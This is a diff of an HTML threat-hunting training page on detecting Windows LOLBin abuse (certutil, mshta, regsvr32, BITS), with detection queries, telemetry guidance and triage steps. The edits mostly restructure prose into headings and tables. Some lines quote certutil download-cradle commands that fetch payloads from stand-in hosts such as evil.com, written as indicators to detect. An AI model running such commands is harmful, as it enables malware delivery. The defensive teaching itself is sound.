@@ -142,9 +142,11 @@
         <!-- SECTION 1 -->
         <section class="content-section" id="what-are-lolbins">
           <h2>What Are LOLBins and Why Hunters Care</h2>
+          <h3>The Core Detection Problem</h3>
           <p>LOLBins are legitimate Windows binaries repurposed by attackers. The key word is legitimate. The tool ships with every Windows installation, carries a valid Microsoft signature, and runs without triggering antivirus or application whitelisting controls. No payload is dropped to disk. No new executable needs to be created. The attacker borrows the OS to do the job.</p>
-          <p>That is the core detection problem. Certutil.exe is always benign as a file. Certutil.exe running with <code>-urlcache -f http://185.220.101.x/payload.exe</code> and writing to <code>%TEMP%</code> is not. The binary cannot be the indicator. The execution context must be.</p>
+          <p>Certutil.exe is always benign as a file. Certutil.exe running with <code>-urlcache -f http://185.220.101.x/payload.exe</code> and writing to <code>%TEMP%</code> is not. The binary cannot be the indicator. The execution context must be.</p>
 
+          <h3>Categories of LOL Techniques</h3>
           <div class="table-wrap">
             <table>
               <thead>
@@ -179,6 +181,7 @@
             </table>
           </div>
 
+          <h3>ATT&CK Anchor and the LOLBAS Project</h3>
           <p>The ATT&CK anchor is T1218 System Binary Proxy Execution (formerly named Signed Binary Proxy Execution), which covers 12 subtechniques: T1218.001 (Compiled HTML File), T1218.003 (CMSTP), T1218.004 (InstallUtil), T1218.005 (Mshta), T1218.007 (Msiexec), T1218.008 (Odbcconf), T1218.009 (Regasm/Regsvcs), T1218.010 (Regsvr32), T1218.011 (Rundll32), T1218.012 (Verclsid), T1218.013 (Mavinject), and T1218.014 (MMC). Each subtechnique has a distinct behavior profile and requires its own detection approach.</p>
 
           <p>The community catalog is the <strong>LOLBAS Project</strong> at lolbas-project.github.io. It documents 150+ LOLBins with function tags (execute, download, upload, compile, decode), command-line examples, and ATT&CK mappings. Treat it as a required reference alongside ATT&CK Navigator for hunt hypothesis generation.</p>
@@ -189,14 +192,44 @@
         <!-- SECTION 2 -->
         <section class="content-section" id="hunting-mindset">
           <h2>The Hunting Mindset for LOLBin Abuse</h2>
-          <p>Signatures fail here. AV and EDR cannot flag the binary itself because it is a clean system tool. Detection requires behavioral context, and behavioral context has four dimensions.</p>
-          <p>Parent process: who spawned it? A user launching certutil directly from explorer.exe is suspicious. Winword.exe spawning certutil is nearly always malicious. The parent-child relationship is often more telling than the command line itself.</p>
-          <p>Command line flags: what arguments? Certutil is a certificate utility. Any invocation that references <code>-urlcache</code>, <code>-decode</code>, or <code>-encode</code> with a non-certificate-related path is worth examining.</p>
-          <p>Network behavior: did it make outbound connections? Download cradles require DNS resolution and HTTP(S) requests. Certutil reaching an external IP is a process-to-network correlation opportunity.</p>
-          <p>Execution directory: from System32 or from <code>%TEMP%</code>? LOLBins themselves run from System32 or SysWOW64. The files they write or load often land in user-writable paths like <code>%TEMP%</code>, <code>%APPDATA%</code>, or <code>C:\Users\Public</code>.</p>
+          <p>Signatures fail here. AV and EDR cannot flag the binary itself because it is a clean system tool. Detection requires behavioral context.</p>
 
-          <p>Three ABLE hypotheses applied directly:</p>
+          <h3>Four Dimensions of Behavioral Context</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Dimension</th>
+                  <th>Question</th>
+                  <th>What to Look For</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Parent process</td>
+                  <td>Who spawned it?</td>
+                  <td>A user launching certutil directly from explorer.exe is suspicious; Winword.exe spawning certutil is nearly always malicious. The parent-child relationship is often more telling than the command line itself.</td>
+                </tr>
+                <tr>
+                  <td>Command line flags</td>
+                  <td>What arguments?</td>
+                  <td>Certutil is a certificate utility. Any invocation referencing <code>-urlcache</code>, <code>-decode</code>, or <code>-encode</code> with a non-certificate-related path is worth examining.</td>
+                </tr>
+                <tr>
+                  <td>Network behavior</td>
+                  <td>Did it make outbound connections?</td>
+                  <td>Download cradles require DNS resolution and HTTP(S) requests. Certutil reaching an external IP is a process-to-network correlation opportunity.</td>
+                </tr>
+                <tr>
+                  <td>Execution directory</td>
+                  <td>From System32 or from <code>%TEMP%</code>?</td>
+                  <td>LOLBins themselves run from System32 or SysWOW64. Files they write or load often land in user-writable paths like <code>%TEMP%</code>, <code>%APPDATA%</code>, or <code>C:\Users\Public</code>.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
 
+          <h3>Three ABLE Hypotheses</h3>
           <div class="table-wrap">
             <table>
               <thead>
@@ -230,22 +263,26 @@
             </table>
           </div>
 
+          <h3>What to Hunt First</h3>
           <p>Prioritize certutil and mshta first. They sit at the top of Red Canary's detection reports for multiple consecutive years. Regsvr32 Squiblydoo was actively exploited for 8+ years before widespread detection caught up. BITS (bitsadmin and PowerShell Start-BitsTransfer) is heavily used for stealthy persistence and background downloads because it runs as a Windows service and is trusted by most security tools.</p>
         </section>
 
         <!-- SECTION 3 -->
         <section class="content-section" id="data-sources">
           <h2>Data Sources for LOLBin Hunting</h2>
+          <h3>Process Creation Telemetry</h3>
           <p>The foundation is Sysmon Event ID 1 (process creation) with full command line captured. Without the CommandLine field, LOLBin hunting is nearly blind. You know a binary ran. You do not know what it was told to do.</p>
           <p>Windows Security Event 4688 covers process creation but requires an explicit GPO change to capture command line arguments: Computer Config > Policies > Windows Settings > Security Settings > Advanced Audit Policy > Detailed Tracking > Audit Process Creation, PLUS enable "Include command line in process creation events" via a separate GPO setting. Without this, 4688 tells you certutil.exe ran. It does not tell you whether it ran a hash check or a download cradle.</p>
 
           <div class="callout-warning"><strong>Warning:</strong> Windows 4688 without the command line audit policy gives you a process name with no context. You cannot distinguish <code>certutil -hashfile</code> (legitimate integrity check) from <code>certutil -urlcache -f http://evil.com/payload</code> without the ProcessCommandLine field. This configuration gap is one of the most common reasons LOLBin hunts produce nothing actionable despite real activity occurring.</div>
 
+          <h3>Network and File Correlation</h3>
           <p>Sysmon Event ID 3 (network connection) links a LOLBin process to outbound connections by PID. This is the critical correlation for download cradles. Sysmon EID 1 tells you the command line; EID 3 tells you the destination IP and port. Together they confirm intent.</p>
           <p>Sysmon Event ID 11 (file creation) catches certutil or wscript writing staged payloads to disk. Pair with EID 1 to connect file creation back to the specific process invocation.</p>
           <p>Modern EDR provides full ancestry chains. Winword.exe > cmd.exe > certutil.exe is a high-confidence indicator regardless of what certutil was told to do. The parent chain establishes context before you even look at the command line.</p>
           <p>DNS logs catch download cradles at resolution time. Certutil reaching a DGA-pattern domain is visible in DNS before Sysmon fires. DNS is also useful for BITS abuse, where the job may run as a background service with limited process-level telemetry.</p>
 
+          <h3>LOLBin to Telemetry Map</h3>
           <div class="table-wrap">
             <table>
               <thead>
@@ -295,7 +332,8 @@
         <!-- SECTION 4 -->
         <section class="content-section" id="hunt-hypotheses">
           <h2>Hunt Hypotheses for LOLBin Abuse</h2>
-          <p>Five prioritized hypotheses, each anchored to ATT&CK, a specific behavior pattern, and the evidence source that confirms or denies it.</p>
+          <h3>Five Prioritized Hypotheses</h3>
+          <p>Each is anchored to ATT&CK, a specific behavior pattern, and the evidence source that confirms or denies it.</p>
 
           <div class="table-wrap">
             <table>
@@ -350,7 +388,7 @@
           <h2>Hunt Queries: KQL, SPL, and Sigma</h2>
           <p>Four queries covering the highest-priority hypotheses. Run these broad first, then apply the tuning steps described after each block.</p>
 
-          <p><strong>KQL: certutil download cradle (Microsoft Sentinel / MDE)</strong></p>
+          <h3>KQL: Certutil Download Cradle (Microsoft Sentinel / MDE)</h3>
           <div class="code-block">
             <div class="code-block-header"><span class="code-block-lang">KQL</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
             <pre><code>DeviceProcessEvents
@@ -362,7 +400,7 @@
 | order by Timestamp desc</code></pre>
           </div>
 
-          <p><strong>KQL: regsvr32 Squiblydoo (Microsoft Sentinel / MDE)</strong></p>
+          <h3>KQL: Regsvr32 Squiblydoo (Microsoft Sentinel / MDE)</h3>
           <div class="code-block">
             <div class="code-block-header"><span class="code-block-lang">KQL</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
             <pre><code>DeviceProcessEvents
@@ -372,7 +410,7 @@
 | order by Timestamp desc</code></pre>
           </div>
 
-          <p><strong>Sigma: MSHTA spawning suspicious child process</strong></p>
+          <h3>Sigma: MSHTA Spawning Suspicious Child Process</h3>
           <div class="code-block">
             <div class="code-block-header"><span class="code-block-lang">SIGMA</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
             <pre><code>title: MSHTA Spawning Suspicious Child Process
@@ -400,7 +438,7 @@ tags:
   - attack.t1218.005</code></pre>
           </div>
 
-          <p><strong>SPL: BITS abuse (Splunk with Sysmon)</strong></p>
+          <h3>SPL: BITS Abuse (Splunk with Sysmon)</h3>
           <div class="code-block">
             <div class="code-block-header"><span class="code-block-lang">SPL</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
             <pre><code>index=sysmon EventCode=1 Image="*\\bitsadmin.exe"
@@ -411,6 +449,7 @@ tags:
 | sort -_time</code></pre>
           </div>
 
+          <h3>Tuning the Rules</h3>
           <p>Tuning order: start broad, then layer context. For certutil, first suppress hash-check invocations (<code>certutil -hashfile</code> with no URL) by filtering out CommandLine where http is absent. Then add a parent process allow-list for WSUS relay servers where certutil running outbound is normal. For BITS, extend the destination domain allow-list to include your CDN providers and patch management servers. Do not suppress the rule. Add context to narrow it.</p>
 
           <div class="callout-tip"><strong>Tip:</strong> The certutil KQL query will hit on legitimate WSUS activity in environments with relay servers. Before adding suppressions, check whether those WSUS servers are themselves generating the events (they should be admin assets) or whether it is user workstations that happen to download from Microsoft. Same binary, different risk profile.</div>
@@ -421,7 +460,7 @@ tags:
           <h2>Evidence Analysis and Triage</h2>
           <p>Query results are not findings. They are candidates. Triage separates false positives from real signals using execution context, not gut feel.</p>
 
-          <p>Common false positive patterns per LOLBin:</p>
+          <h3>Common False Positive Patterns</h3>
           <ul>
             <li><strong>certutil:</strong> <code>certutil -hashfile</code> is a common integrity check tool. Certutil reaching windowsupdate.microsoft.com or download.microsoft.com is typical WSUS relay behavior. Neither pattern warrants escalation.</li>
             <li><strong>regsvr32:</strong> Registering COM DLLs in System32 during software installs is normal. The path matters. System32 paths are benign; user-writable paths are not.</li>
@@ -429,7 +468,7 @@ tags:
             <li><strong>bitsadmin:</strong> WSUS, SCCM, and Windows Update all use BITS. Filter known WSUS server destinations before treating BITS transfers as suspicious.</li>
           </ul>
 
-          <p>Context factors in priority order when triaging a hit:</p>
+          <h3>Context Factors in Priority Order</h3>
           <ol>
             <li>Execution account: admin service account vs. standard user</li>
             <li>Parent process: explorer.exe (user-initiated) vs. winword.exe (document macro) vs. lsass.exe (injection)</li>
@@ -438,25 +477,80 @@ tags:
             <li>Network destination: known CDN/WSUS IP vs. residential IP vs. DGA-pattern domain</li>
           </ol>
 
-          <p>Apply the Admiralty System to score confidence. Source A (EDR telemetry) plus content grade 1 (directly observed, no inference) gives you maximum confidence. Source A plus content grade 2 (observed but requiring correlation) is still high confidence. Downgrade when you are working from proxy logs alone with no process-level confirmation.</p>
+          <h3>Scoring Confidence with Admiralty</h3>
+          <p>Source A (EDR telemetry) plus content grade 1 (directly observed, no inference) gives you maximum confidence. Source A plus content grade 2 (observed but requiring correlation) is still high confidence. Downgrade when you are working from proxy logs alone with no process-level confirmation.</p>
 
-          <p>The pivot chain from a certutil hit to IR escalation: certutil.exe reaching 185.220.101.x (Tor exit node) -> pivot on that IP across all endpoints in the time window -> identify every process that contacted the same IP -> check for lateral movement events (4648, 4624 type 3, SMB) from those hosts -> if you find more than one host reaching the same C2 IP, you have a campaign, not an isolated incident.</p>
+          <h3>Pivot Chain: Certutil Hit to IR Escalation</h3>
+          <div class="process-flow">
+            <div class="flow-step">
+              <span class="flow-step-num">1</span>
+              <div class="flow-step-title">Initial Hit</div>
+              <div class="flow-step-desc">certutil.exe reaching 185.220.101.x (Tor exit node)</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">2</span>
+              <div class="flow-step-title">Pivot on IP</div>
+              <div class="flow-step-desc">Across all endpoints in the time window</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">3</span>
+              <div class="flow-step-title">Identify Processes</div>
+              <div class="flow-step-desc">Every process that contacted the same IP</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">4</span>
+              <div class="flow-step-title">Check Lateral Movement</div>
+              <div class="flow-step-desc">Events 4648, 4624 type 3, SMB from those hosts</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">5</span>
+              <div class="flow-step-title">Confirm Scope</div>
+              <div class="flow-step-desc">More than one host reaching the same C2 IP means a campaign, not an isolated incident</div>
+            </div>
+          </div>
 
-          <p>Decision criteria: admin account on admin asset reaching a known patch server is a documented FP. Write a suppression query and close. Standard user account on a user workstation reaching a residential IP with mshta spawning powershell is escalate to IR immediately. Do not wait for a SIEM alert. The hunt found the incident.</p>
+          <h3>Decision Criteria</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Scenario</th>
+                  <th>Decision</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Admin account on admin asset reaching a known patch server</td>
+                  <td>Documented FP. Write a suppression query and close.</td>
+                </tr>
+                <tr>
+                  <td>Standard user account on a user workstation reaching a residential IP with mshta spawning powershell</td>
+                  <td>Escalate to IR immediately. Do not wait for a SIEM alert. The hunt found the incident.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
         </section>
 
         <!-- SECTION 7 -->
         <section class="content-section" id="hunt-to-detection">
           <h2>From Hunt to Detection</h2>
+          <h3>Turning Hunts Into Detections</h3>
           <p>Every LOLBin hunt closes with content. Either a suppression query documenting a confirmed FP, or a new detection rule derived from a confirmed TP. Hunts that produce no content are organizational debt because you spent analyst time without improving coverage.</p>
 
           <p>Converting a hunt query to a production rule: add parent process suppression for known-good parents (WSUS server spawning certutil), add destination domain allow-list for BITS transfers, add asset severity scoring so a hit on a DC generates a P1 and the same hit on an isolated dev box generates a P3. Set a confidence threshold before the rule fires an alert. Not every hit needs to page someone. Some can go into a triage queue.</p>
 
-          <p>Sigma versus platform-native: use Sigma when the content needs to run on multiple SIEM or EDR platforms. Use KQL or SPL for environment-specific enrichment joins. Joining certutil events to your user risk score (from Microsoft Entra ID Protection or CrowdStrike Identity) is not expressible in Sigma. Do both. Sigma for portability, platform-native for enriched alerting.</p>
+          <h3>Sigma vs. Platform-Native</h3>
+          <p>Use Sigma when the content needs to run on multiple SIEM or EDR platforms. Use KQL or SPL for environment-specific enrichment joins. Joining certutil events to your user risk score (from Microsoft Entra ID Protection or CrowdStrike Identity) is not expressible in Sigma. Do both. Sigma for portability, platform-native for enriched alerting.</p>
 
           <div class="callout-info"><strong>Note:</strong> This chapter applies threat-hunting methodology to LOLBin abuse. For the complete catalog of Windows LOLBins, LOLScripts, LOLDrivers, attacker tradecraft, threat actor campaigns, and advanced evasion techniques, continue to the LOLBAS module. <a href="../lolbas/index.html" class="accent">Start LOLBAS: Chapter 1 →</a></div>
 
-          <p>Five highest-ROI LOLBin detections to build first, ranked by detection complexity and expected false positive rate:</p>
+          <h3>Five Highest-ROI Detections to Build First</h3>
+          <p>Ranked by detection complexity and expected false positive rate:</p>
 
           <div class="table-wrap">
             <table>
